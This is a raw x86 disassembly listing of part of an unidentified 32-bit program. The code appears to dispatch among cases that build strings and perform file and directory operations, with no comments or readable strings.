  402b93:	8d 8d e0 fd ff ff    	lea    -0x220(%ebp),%ecx
  402b99:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  402b9f:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  402ba5:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  402bab:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  402bae:	e9 e0 04 00 00       	jmp    0x403093
  402bb3:	33 db                	xor    %ebx,%ebx
  402bb5:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  402bb8:	53                   	push   %ebx
  402bb9:	e8 a1 ef ff ff       	call   0x401b5f
  402bbe:	50                   	push   %eax
  402bbf:	8d 45 f0             	lea    -0x10(%ebp),%eax
  402bc2:	50                   	push   %eax
  402bc3:	e8 32 87 00 00       	call   0x40b2fa
  402bc8:	51                   	push   %ecx
  402bc9:	51                   	push   %ecx
  402bca:	8d 45 f0             	lea    -0x10(%ebp),%eax
  402bcd:	8b cc                	mov    %esp,%ecx
  402bcf:	50                   	push   %eax
  402bd0:	ff 15 34 d2 40 00    	call   *0x40d234
  402bd6:	e8 20 f6 ff ff       	call   0x4021fb
  402bdb:	83 c4 10             	add    $0x10,%esp
  402bde:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  402be1:	ff 15 38 d2 40 00    	call   *0x40d238
  402be7:	48                   	dec    %eax
  402be8:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  402beb:	48                   	dec    %eax
  402bec:	50                   	push   %eax
  402bed:	8d 85 40 ff ff ff    	lea    -0xc0(%ebp),%eax
  402bf3:	53                   	push   %ebx
  402bf4:	50                   	push   %eax
  402bf5:	ff 15 3c d2 40 00    	call   *0x40d23c
  402bfb:	50                   	push   %eax
  402bfc:	8d 85 80 fe ff ff    	lea    -0x180(%ebp),%eax
  402c02:	50                   	push   %eax
  402c03:	e8 66 86 00 00       	call   0x40b26e
  402c08:	51                   	push   %ecx
  402c09:	51                   	push   %ecx
  402c0a:	8b cc                	mov    %esp,%ecx
  402c0c:	50                   	push   %eax
  402c0d:	68 dc d6 40 00       	push   $0x40d6dc
  402c12:	51                   	push   %ecx
  402c13:	e8 ac 9a 00 00       	call   0x40c6c4
  402c18:	51                   	push   %ecx
  402c19:	8d 45 d8             	lea    -0x28(%ebp),%eax
  402c1c:	8b cc                	mov    %esp,%ecx
  402c1e:	50                   	push   %eax
  402c1f:	68 18 d5 40 00       	push   $0x40d518
  402c24:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  402c2a:	e8 c1 7f 00 00       	call   0x40abf0
  402c2f:	83 c4 20             	add    $0x20,%esp
  402c32:	8d 8d 80 fe ff ff    	lea    -0x180(%ebp),%ecx
  402c38:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  402c3e:	8d 8d 40 ff ff ff    	lea    -0xc0(%ebp),%ecx
  402c44:	ff 15 9c d2 40 00    	call   *0x40d29c
  402c4a:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  402c4d:	e9 eb 07 00 00       	jmp    0x40343d
  402c52:	33 db                	xor    %ebx,%ebx
  402c54:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  402c57:	53                   	push   %ebx
  402c58:	e8 02 ef ff ff       	call   0x401b5f
  402c5d:	50                   	push   %eax
  402c5e:	8d 45 f0             	lea    -0x10(%ebp),%eax
  402c61:	50                   	push   %eax
  402c62:	e8 93 86 00 00       	call   0x40b2fa
  402c67:	59                   	pop    %ecx
  402c68:	59                   	pop    %ecx
  402c69:	6a 01                	push   $0x1
  402c6b:	53                   	push   %ebx
  402c6c:	53                   	push   %ebx
  402c6d:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  402c70:	ff 15 98 d2 40 00    	call   *0x40d298
  402c76:	50                   	push   %eax
  402c77:	68 d0 d6 40 00       	push   $0x40d6d0
  402c7c:	53                   	push   %ebx
  402c7d:	ff 15 9c d3 40 00    	call   *0x40d39c
  402c83:	8d 45 f0             	lea    -0x10(%ebp),%eax
  402c86:	50                   	push   %eax
  402c87:	8d 45 80             	lea    -0x80(%ebp),%eax
  402c8a:	50                   	push   %eax
  402c8b:	e8 de 85 00 00       	call   0x40b26e
  402c90:	51                   	push   %ecx
  402c91:	51                   	push   %ecx
  402c92:	8b cc                	mov    %esp,%ecx
  402c94:	50                   	push   %eax
  402c95:	68 bc d6 40 00       	push   $0x40d6bc
  402c9a:	51                   	push   %ecx
  402c9b:	e8 24 9a 00 00       	call   0x40c6c4
  402ca0:	51                   	push   %ecx
  402ca1:	8d 45 d6             	lea    -0x2a(%ebp),%eax
  402ca4:	8b cc                	mov    %esp,%ecx
  402ca6:	50                   	push   %eax
  402ca7:	68 18 d5 40 00       	push   $0x40d518
  402cac:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  402cb2:	e8 39 7f 00 00       	call   0x40abf0
  402cb7:	83 c4 20             	add    $0x20,%esp
  402cba:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  402cbd:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  402cc3:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  402cc6:	e9 72 07 00 00       	jmp    0x40343d
  402ccb:	8d 8d 7c fd ff ff    	lea    -0x284(%ebp),%ecx
  402cd1:	e8 bc 07 00 00       	call   0x403492
  402cd6:	6a 03                	push   $0x3
  402cd8:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  402cdb:	e8 7f ee ff ff       	call   0x401b5f
  402ce0:	83 ec 10             	sub    $0x10,%esp
  402ce3:	8b cc                	mov    %esp,%ecx
  402ce5:	50                   	push   %eax
  402ce6:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  402cec:	6a 02                	push   $0x2
  402cee:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  402cf1:	e8 69 ee ff ff       	call   0x401b5f
  402cf6:	83 ec 10             	sub    $0x10,%esp
  402cf9:	8b cc                	mov    %esp,%ecx
  402cfb:	50                   	push   %eax
  402cfc:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  402d02:	6a 01                	push   $0x1
  402d04:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  402d07:	e8 53 ee ff ff       	call   0x401b5f
  402d0c:	83 ec 10             	sub    $0x10,%esp
  402d0f:	8b cc                	mov    %esp,%ecx
  402d11:	50                   	push   %eax
  402d12:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  402d18:	33 db                	xor    %ebx,%ebx
  402d1a:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  402d1d:	53                   	push   %ebx
  402d1e:	e8 3c ee ff ff       	call   0x401b5f
  402d23:	50                   	push   %eax
  402d24:	8d 85 20 ff ff ff    	lea    -0xe0(%ebp),%eax
  402d2a:	50                   	push   %eax
  402d2b:	e8 ca 85 00 00       	call   0x40b2fa
  402d30:	59                   	pop    %ecx
  402d31:	59                   	pop    %ecx
  402d32:	8b c8                	mov    %eax,%ecx
  402d34:	ff 15 98 d2 40 00    	call   *0x40d298
  402d3a:	50                   	push   %eax
  402d3b:	8d 8d 7c fd ff ff    	lea    -0x284(%ebp),%ecx
  402d41:	e8 06 f9 ff ff       	call   0x40264c
  402d46:	8d 8d 20 ff ff ff    	lea    -0xe0(%ebp),%ecx
  402d4c:	88 45 0b             	mov    %al,0xb(%ebp)
  402d4f:	ff 15 9c d2 40 00    	call   *0x40d29c
  402d55:	38 5d 0b             	cmp    %bl,0xb(%ebp)
  402d58:	53                   	push   %ebx
  402d59:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  402d5c:	74 5b                	je     0x402db9
  402d5e:	e8 fc ed ff ff       	call   0x401b5f
  402d63:	50                   	push   %eax
  402d64:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
  402d6a:	50                   	push   %eax
  402d6b:	e8 8a 85 00 00       	call   0x40b2fa
  402d70:	50                   	push   %eax
  402d71:	8d 85 60 fe ff ff    	lea    -0x1a0(%ebp),%eax
  402d77:	50                   	push   %eax
  402d78:	e8 f1 84 00 00       	call   0x40b26e
  402d7d:	8b cc                	mov    %esp,%ecx
  402d7f:	50                   	push   %eax
  402d80:	68 ac d6 40 00       	push   $0x40d6ac
  402d85:	51                   	push   %ecx
  402d86:	e8 39 99 00 00       	call   0x40c6c4
  402d8b:	51                   	push   %ecx
  402d8c:	8d 45 dd             	lea    -0x23(%ebp),%eax
  402d8f:	8b cc                	mov    %esp,%ecx
  402d91:	50                   	push   %eax
  402d92:	68 18 d5 40 00       	push   $0x40d518
  402d97:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  402d9d:	e8 4e 7e 00 00       	call   0x40abf0
  402da2:	83 c4 20             	add    $0x20,%esp
  402da5:	8d 8d 60 fe ff ff    	lea    -0x1a0(%ebp),%ecx
  402dab:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  402db1:	8d 8d 00 ff ff ff    	lea    -0x100(%ebp),%ecx
  402db7:	eb 59                	jmp    0x402e12
  402db9:	e8 a1 ed ff ff       	call   0x401b5f
  402dbe:	50                   	push   %eax
  402dbf:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
  402dc5:	50                   	push   %eax
  402dc6:	e8 2f 85 00 00       	call   0x40b2fa
  402dcb:	50                   	push   %eax
  402dcc:	8d 85 00 fe ff ff    	lea    -0x200(%ebp),%eax
  402dd2:	50                   	push   %eax
  402dd3:	e8 96 84 00 00       	call   0x40b26e
  402dd8:	8b cc                	mov    %esp,%ecx
  402dda:	50                   	push   %eax
  402ddb:	68 94 d6 40 00       	push   $0x40d694
  402de0:	51                   	push   %ecx
  402de1:	e8 de 98 00 00       	call   0x40c6c4
  402de6:	51                   	push   %ecx
  402de7:	8d 45 d5             	lea    -0x2b(%ebp),%eax
  402dea:	8b cc                	mov    %esp,%ecx
  402dec:	50                   	push   %eax
  402ded:	68 8c d6 40 00       	push   $0x40d68c
  402df2:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  402df8:	e8 f3 7d 00 00       	call   0x40abf0
  402dfd:	83 c4 20             	add    $0x20,%esp
  402e00:	8d 8d 00 fe ff ff    	lea    -0x200(%ebp),%ecx
  402e06:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  402e0c:	8d 8d e0 fe ff ff    	lea    -0x120(%ebp),%ecx
  402e12:	ff 15 9c d2 40 00    	call   *0x40d29c
  402e18:	8d 8d 7c fd ff ff    	lea    -0x284(%ebp),%ecx
  402e1e:	e8 7d 06 00 00       	call   0x4034a0
  402e23:	e9 1b 06 00 00       	jmp    0x403443
  402e28:	33 db                	xor    %ebx,%ebx
  402e2a:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  402e2d:	53                   	push   %ebx
  402e2e:	6a 03                	push   $0x3
  402e30:	e8 2a ed ff ff       	call   0x401b5f
  402e35:	83 ec 10             	sub    $0x10,%esp
  402e38:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  402e3b:	8b fc                	mov    %esp,%edi
  402e3d:	50                   	push   %eax
  402e3e:	56                   	push   %esi
  402e3f:	6a 02                	push   $0x2
  402e41:	e8 19 ed ff ff       	call   0x401b5f
  402e46:	50                   	push   %eax
  402e47:	56                   	push   %esi
  402e48:	6a 01                	push   $0x1
  402e4a:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  402e4d:	e8 0d ed ff ff       	call   0x401b5f
  402e52:	50                   	push   %eax
  402e53:	8d 85 c0 fd ff ff    	lea    -0x240(%ebp),%eax
  402e59:	50                   	push   %eax
  402e5a:	e8 59 98 00 00       	call   0x40c6b8
  402e5f:	83 c4 0c             	add    $0xc,%esp
  402e62:	50                   	push   %eax
  402e63:	8d 85 c0 fe ff ff    	lea    -0x140(%ebp),%eax
  402e69:	50                   	push   %eax
  402e6a:	e8 49 98 00 00       	call   0x40c6b8
  402e6f:	83 c4 0c             	add    $0xc,%esp
  402e72:	50                   	push   %eax
  402e73:	8d 85 40 fe ff ff    	lea    -0x1c0(%ebp),%eax
  402e79:	50                   	push   %eax
  402e7a:	e8 39 98 00 00       	call   0x40c6b8
  402e7f:	83 c4 0c             	add    $0xc,%esp
  402e82:	50                   	push   %eax
  402e83:	57                   	push   %edi
  402e84:	e8 2f 98 00 00       	call   0x40c6b8
  402e89:	83 c4 0c             	add    $0xc,%esp
  402e8c:	6a 56                	push   $0x56
  402e8e:	e8 f4 e6 ff ff       	call   0x401587
  402e93:	83 c4 18             	add    $0x18,%esp
  402e96:	8d 8d 40 fe ff ff    	lea    -0x1c0(%ebp),%ecx
  402e9c:	8b f8                	mov    %eax,%edi
  402e9e:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  402ea4:	8d 8d c0 fe ff ff    	lea    -0x140(%ebp),%ecx
  402eaa:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  402eb0:	8d 8d c0 fd ff ff    	lea    -0x240(%ebp),%ecx
  402eb6:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  402ebc:	53                   	push   %ebx
  402ebd:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  402ec0:	e8 9a ec ff ff       	call   0x401b5f
  402ec5:	50                   	push   %eax
  402ec6:	8d 85 20 fe ff ff    	lea    -0x1e0(%ebp),%eax
  402ecc:	50                   	push   %eax
  402ecd:	e8 28 84 00 00       	call   0x40b2fa
  402ed2:	50                   	push   %eax
  402ed3:	8d 85 a0 fe ff ff    	lea    -0x160(%ebp),%eax
  402ed9:	50                   	push   %eax
  402eda:	e8 8f 83 00 00       	call   0x40b26e
  402edf:	8b cc                	mov    %esp,%ecx
  402ee1:	50                   	push   %eax
  402ee2:	68 78 d6 40 00       	push   $0x40d678
  402ee7:	51                   	push   %ecx
  402ee8:	e8 d7 97 00 00       	call   0x40c6c4
  402eed:	51                   	push   %ecx
  402eee:	8d 45 db             	lea    -0x25(%ebp),%eax
  402ef1:	8b cc                	mov    %esp,%ecx
  402ef3:	be 18 d5 40 00       	mov    $0x40d518,%esi
  402ef8:	50                   	push   %eax
  402ef9:	56                   	push   %esi
  402efa:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  402f00:	e8 eb 7c 00 00       	call   0x40abf0
  402f05:	83 c4 20             	add    $0x20,%esp
  402f08:	8d 8d a0 fe ff ff    	lea    -0x160(%ebp),%ecx
  402f0e:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  402f14:	8d 8d 20 fe ff ff    	lea    -0x1e0(%ebp),%ecx
  402f1a:	ff 15 9c d2 40 00    	call   *0x40d29c
  402f20:	8d 45 d2             	lea    -0x2e(%ebp),%eax
  402f23:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  402f26:	50                   	push   %eax
  402f27:	ff 15 dc d2 40 00    	call   *0x40d2dc
  402f2d:	6a 04                	push   $0x4
  402f2f:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  402f32:	e8 28 ec ff ff       	call   0x401b5f
  402f37:	8b c8                	mov    %eax,%ecx
  402f39:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  402f3f:	50                   	push   %eax
  402f40:	ff 15 58 d3 40 00    	call   *0x40d358
  402f46:	99                   	cltd
  402f47:	52                   	push   %edx
  402f48:	50                   	push   %eax
  402f49:	8d 45 f0             	lea    -0x10(%ebp),%eax
  402f4c:	50                   	push   %eax
  402f4d:	57                   	push   %edi
  402f4e:	e8 f6 f3 ff ff       	call   0x402349
  402f53:	83 c4 14             	add    $0x14,%esp
  402f56:	84 c0                	test   %al,%al
  402f58:	53                   	push   %ebx
  402f59:	0f 84 c9 00 00 00    	je     0x403028
  402f5f:	53                   	push   %ebx
  402f60:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  402f63:	e8 f7 eb ff ff       	call   0x401b5f
  402f68:	50                   	push   %eax
  402f69:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  402f6f:	50                   	push   %eax
  402f70:	e8 85 83 00 00       	call   0x40b2fa
  402f75:	59                   	pop    %ecx
  402f76:	59                   	pop    %ecx
  402f77:	8b c8                	mov    %eax,%ecx
  402f79:	ff 15 98 d2 40 00    	call   *0x40d298
  402f7f:	50                   	push   %eax
  402f80:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  402f83:	ff 15 b8 d2 40 00    	call   *0x40d2b8
  402f89:	50                   	push   %eax
  402f8a:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  402f8d:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  402f93:	50                   	push   %eax
  402f94:	e8 a5 87 00 00       	call   0x40b73e
  402f99:	83 c4 10             	add    $0x10,%esp
  402f9c:	8d 8d 70 ff ff ff    	lea    -0x90(%ebp),%ecx
  402fa2:	ff 15 9c d2 40 00    	call   *0x40d29c
  402fa8:	53                   	push   %ebx
  402fa9:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  402fac:	e8 ae eb ff ff       	call   0x401b5f
  402fb1:	50                   	push   %eax
  402fb2:	8d 85 30 ff ff ff    	lea    -0xd0(%ebp),%eax
  402fb8:	50                   	push   %eax
  402fb9:	e8 3c 83 00 00       	call   0x40b2fa
  402fbe:	50                   	push   %eax
  402fbf:	8d 85 50 ff ff ff    	lea    -0xb0(%ebp),%eax
  402fc5:	50                   	push   %eax
  402fc6:	e8 a3 82 00 00       	call   0x40b26e
  402fcb:	8b cc                	mov    %esp,%ecx
  402fcd:	50                   	push   %eax
  402fce:	68 64 d6 40 00       	push   $0x40d664
  402fd3:	51                   	push   %ecx
  402fd4:	e8 eb 96 00 00       	call   0x40c6c4
  402fd9:	51                   	push   %ecx
  402fda:	8d 45 d9             	lea    -0x27(%ebp),%eax
  402fdd:	8b cc                	mov    %esp,%ecx
  402fdf:	50                   	push   %eax
  402fe0:	56                   	push   %esi
  402fe1:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  402fe7:	e8 04 7c 00 00       	call   0x40abf0
  402fec:	83 c4 20             	add    $0x20,%esp
  402fef:	8d 8d 50 ff ff ff    	lea    -0xb0(%ebp),%ecx
  402ff5:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  402ffb:	8d 8d 30 ff ff ff    	lea    -0xd0(%ebp),%ecx
  403001:	ff 15 9c d2 40 00    	call   *0x40d29c
  403007:	57                   	push   %edi
  403008:	8d 45 d3             	lea    -0x2d(%ebp),%eax
  40300b:	83 ec 10             	sub    $0x10,%esp
  40300e:	8b cc                	mov    %esp,%ecx
  403010:	50                   	push   %eax
  403011:	68 a0 d4 40 00       	push   $0x40d4a0
  403016:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  40301c:	6a 58                	push   $0x58
  40301e:	e8 7e e4 ff ff       	call   0x4014a1
  403023:	83 c4 18             	add    $0x18,%esp
  403026:	eb 62                	jmp    0x40308a
  403028:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40302b:	e8 2f eb ff ff       	call   0x401b5f
  403030:	50                   	push   %eax
  403031:	8d 85 f0 fe ff ff    	lea    -0x110(%ebp),%eax
  403037:	50                   	push   %eax
  403038:	e8 bd 82 00 00       	call   0x40b2fa
  40303d:	50                   	push   %eax
  40303e:	8d 85 10 ff ff ff    	lea    -0xf0(%ebp),%eax
  403044:	50                   	push   %eax
  403045:	e8 24 82 00 00       	call   0x40b26e
  40304a:	8b cc                	mov    %esp,%ecx
  40304c:	50                   	push   %eax
  40304d:	68 48 d6 40 00       	push   $0x40d648
  403052:	51                   	push   %ecx
  403053:	e8 6c 96 00 00       	call   0x40c6c4
  403058:	51                   	push   %ecx
  403059:	8d 45 df             	lea    -0x21(%ebp),%eax
  40305c:	8b cc                	mov    %esp,%ecx
  40305e:	50                   	push   %eax
  40305f:	68 8c d6 40 00       	push   $0x40d68c
  403064:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  40306a:	e8 81 7b 00 00       	call   0x40abf0
  40306f:	83 c4 20             	add    $0x20,%esp
  403072:	8d 8d 10 ff ff ff    	lea    -0xf0(%ebp),%ecx
  403078:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40307e:	8d 8d f0 fe ff ff    	lea    -0x110(%ebp),%ecx
  403084:	ff 15 9c d2 40 00    	call   *0x40d29c
  40308a:	57                   	push   %edi
  40308b:	e8 6a 96 00 00       	call   0x40c6fa
  403090:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  403093:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  403099:	e9 a5 03 00 00       	jmp    0x403443
  40309e:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  4030a1:	33 db                	xor    %ebx,%ebx
  4030a3:	50                   	push   %eax
  4030a4:	53                   	push   %ebx
  4030a5:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  4030a8:	e8 b2 ea ff ff       	call   0x401b5f
  4030ad:	50                   	push   %eax
  4030ae:	8d 85 d0 fe ff ff    	lea    -0x130(%ebp),%eax
  4030b4:	50                   	push   %eax
  4030b5:	e8 40 82 00 00       	call   0x40b2fa
  4030ba:	59                   	pop    %ecx
  4030bb:	59                   	pop    %ecx
  4030bc:	8b c8                	mov    %eax,%ecx
  4030be:	ff 15 98 d2 40 00    	call   *0x40d298
  4030c4:	50                   	push   %eax
  4030c5:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4030c8:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  4030ce:	8d 8d d0 fe ff ff    	lea    -0x130(%ebp),%ecx
  4030d4:	ff 15 9c d2 40 00    	call   *0x40d29c
  4030da:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4030dd:	ff 15 98 d2 40 00    	call   *0x40d298
  4030e3:	50                   	push   %eax
  4030e4:	ff 15 44 d1 40 00    	call   *0x40d144
  4030ea:	a8 10                	test   $0x10,%al
  4030ec:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4030ef:	74 0f                	je     0x403100
  4030f1:	ff 15 98 d2 40 00    	call   *0x40d298
  4030f7:	50                   	push   %eax
  4030f8:	e8 d9 84 00 00       	call   0x40b5d6
  4030fd:	59                   	pop    %ecx
  4030fe:	eb 0d                	jmp    0x40310d
  403100:	ff 15 98 d2 40 00    	call   *0x40d298
  403106:	50                   	push   %eax
  403107:	ff 15 48 d1 40 00    	call   *0x40d148
  40310d:	85 c0                	test   %eax,%eax
  40310f:	0f 95 c0             	setne  %al
  403112:	3a c3                	cmp    %bl,%al
  403114:	74 42                	je     0x403158
  403116:	8d 45 f0             	lea    -0x10(%ebp),%eax
  403119:	50                   	push   %eax
  40311a:	8d 85 b0 fe ff ff    	lea    -0x150(%ebp),%eax
  403120:	50                   	push   %eax
  403121:	e8 48 81 00 00       	call   0x40b26e
  403126:	51                   	push   %ecx
  403127:	51                   	push   %ecx
  403128:	8b cc                	mov    %esp,%ecx
  40312a:	50                   	push   %eax
  40312b:	68 38 d6 40 00       	push   $0x40d638
  403130:	51                   	push   %ecx
  403131:	e8 8e 95 00 00       	call   0x40c6c4
  403136:	51                   	push   %ecx
  403137:	8d 45 de             	lea    -0x22(%ebp),%eax
  40313a:	8b cc                	mov    %esp,%ecx
  40313c:	50                   	push   %eax
  40313d:	68 18 d5 40 00       	push   $0x40d518
  403142:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  403148:	e8 a3 7a 00 00       	call   0x40abf0
  40314d:	83 c4 20             	add    $0x20,%esp
  403150:	8d 8d b0 fe ff ff    	lea    -0x150(%ebp),%ecx
  403156:	eb 5d                	jmp    0x4031b5
  403158:	83 ec 10             	sub    $0x10,%esp
  40315b:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40315e:	8b c4                	mov    %esp,%eax
  403160:	51                   	push   %ecx
  403161:	50                   	push   %eax
  403162:	e8 67 81 00 00       	call   0x40b2ce
  403167:	59                   	pop    %ecx
  403168:	59                   	pop    %ecx
  403169:	6a 55                	push   $0x55
  40316b:	b9 e8 16 41 00       	mov    $0x4116e8,%ecx
  403170:	e8 b5 df ff ff       	call   0x40112a
  403175:	8d 45 f0             	lea    -0x10(%ebp),%eax
  403178:	50                   	push   %eax
  403179:	8d 85 90 fe ff ff    	lea    -0x170(%ebp),%eax
  40317f:	50                   	push   %eax
  403180:	e8 e9 80 00 00       	call   0x40b26e
  403185:	51                   	push   %ecx
  403186:	51                   	push   %ecx
  403187:	8b cc                	mov    %esp,%ecx
  403189:	50                   	push   %eax
  40318a:	68 24 d6 40 00       	push   $0x40d624
  40318f:	51                   	push   %ecx
  403190:	e8 2f 95 00 00       	call   0x40c6c4
  403195:	51                   	push   %ecx
  403196:	8d 45 dc             	lea    -0x24(%ebp),%eax
  403199:	8b cc                	mov    %esp,%ecx
  40319b:	50                   	push   %eax
  40319c:	68 8c d6 40 00       	push   $0x40d68c
  4031a1:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  4031a7:	e8 44 7a 00 00       	call   0x40abf0
  4031ac:	83 c4 20             	add    $0x20,%esp
  4031af:	8d 8d 90 fe ff ff    	lea    -0x170(%ebp),%ecx
  4031b5:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4031bb:	68 20 d6 40 00       	push   $0x40d620
  4031c0:	6a 01                	push   $0x1
  4031c2:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  4031c5:	e8 95 e9 ff ff       	call   0x401b5f
  4031ca:	50                   	push   %eax
  4031cb:	ff 15 74 d2 40 00    	call   *0x40d274
  4031d1:	59                   	pop    %ecx
  4031d2:	84 c0                	test   %al,%al
  4031d4:	59                   	pop    %ecx
  4031d5:	74 6b                	je     0x403242
  4031d7:	a1 40 d2 40 00       	mov    0x40d240,%eax
  4031dc:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4031df:	ff 30                	push   (%eax)
  4031e1:	6a 5c                	push   $0x5c
  4031e3:	ff 15 44 d2 40 00    	call   *0x40d244
  4031e9:	40                   	inc    %eax
  4031ea:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4031ed:	50                   	push   %eax
  4031ee:	ff 15 48 d2 40 00    	call   *0x40d248
  4031f4:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4031f7:	6a 2a                	push   $0x2a
  4031f9:	50                   	push   %eax
  4031fa:	8d 85 70 fe ff ff    	lea    -0x190(%ebp),%eax
  403200:	50                   	push   %eax
  403201:	e8 d0 94 00 00       	call   0x40c6d6
  403206:	83 c4 0c             	add    $0xc,%esp
  403209:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40320c:	50                   	push   %eax
  40320d:	ff 15 50 d2 40 00    	call   *0x40d250
  403213:	8d 8d 70 fe ff ff    	lea    -0x190(%ebp),%ecx
  403219:	ff 15 9c d2 40 00    	call   *0x40d29c
  40321f:	83 ec 10             	sub    $0x10,%esp
  403222:	8d 45 da             	lea    -0x26(%ebp),%eax
  403225:	8b f4                	mov    %esp,%esi
  403227:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40322a:	50                   	push   %eax
  40322b:	ff 15 98 d2 40 00    	call   *0x40d298
  403231:	50                   	push   %eax
  403232:	8b ce                	mov    %esi,%ecx
  403234:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  40323a:	e8 bc ef ff ff       	call   0x4021fb
  40323f:	83 c4 10             	add    $0x10,%esp
  403242:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  403245:	e9 f3 01 00 00       	jmp    0x40343d
  40324a:	33 db                	xor    %ebx,%ebx
  40324c:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40324f:	53                   	push   %ebx
  403250:	e8 0a e9 ff ff       	call   0x401b5f
  403255:	50                   	push   %eax
  403256:	8d 45 f0             	lea    -0x10(%ebp),%eax
  403259:	50                   	push   %eax
  40325a:	e8 9b 80 00 00       	call   0x40b2fa
  40325f:	59                   	pop    %ecx
  403260:	59                   	pop    %ecx
  403261:	6a 01                	push   $0x1
  403263:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  403266:	e8 f4 e8 ff ff       	call   0x401b5f
  40326b:	50                   	push   %eax
  40326c:	8d 45 a0             	lea    -0x60(%ebp),%eax
  40326f:	50                   	push   %eax
  403270:	e8 85 80 00 00       	call   0x40b2fa
  403275:	a1 40 d2 40 00       	mov    0x40d240,%eax
  40327a:	59                   	pop    %ecx
  40327b:	59                   	pop    %ecx
  40327c:	ff 30                	push   (%eax)
  40327e:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  403281:	6a 5c                	push   $0x5c
  403283:	ff 15 44 d2 40 00    	call   *0x40d244
  403289:	40                   	inc    %eax
  40328a:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40328d:	50                   	push   %eax
  40328e:	8d 45 c0             	lea    -0x40(%ebp),%eax
  403291:	53                   	push   %ebx
  403292:	50                   	push   %eax
  403293:	ff 15 3c d2 40 00    	call   *0x40d23c
  403299:	8d 45 a0             	lea    -0x60(%ebp),%eax
  40329c:	50                   	push   %eax
  40329d:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4032a0:	50                   	push   %eax
  4032a1:	8d 85 50 fe ff ff    	lea    -0x1b0(%ebp),%eax
  4032a7:	50                   	push   %eax
  4032a8:	e8 23 94 00 00       	call   0x40c6d0
  4032ad:	83 c4 0c             	add    $0xc,%esp
  4032b0:	8b c8                	mov    %eax,%ecx
  4032b2:	ff 15 98 d2 40 00    	call   *0x40d298
  4032b8:	50                   	push   %eax
  4032b9:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4032bc:	ff 15 98 d2 40 00    	call   *0x40d298
  4032c2:	50                   	push   %eax
  4032c3:	ff 15 5c d3 40 00    	call   *0x40d35c
  4032c9:	f7 d8                	neg    %eax
  4032cb:	59                   	pop    %ecx
  4032cc:	1a c0                	sbb    %al,%al
  4032ce:	59                   	pop    %ecx
  4032cf:	fe c0                	inc    %al
  4032d1:	8d 8d 50 fe ff ff    	lea    -0x1b0(%ebp),%ecx
  4032d7:	88 45 0b             	mov    %al,0xb(%ebp)
  4032da:	ff 15 9c d2 40 00    	call   *0x40d29c
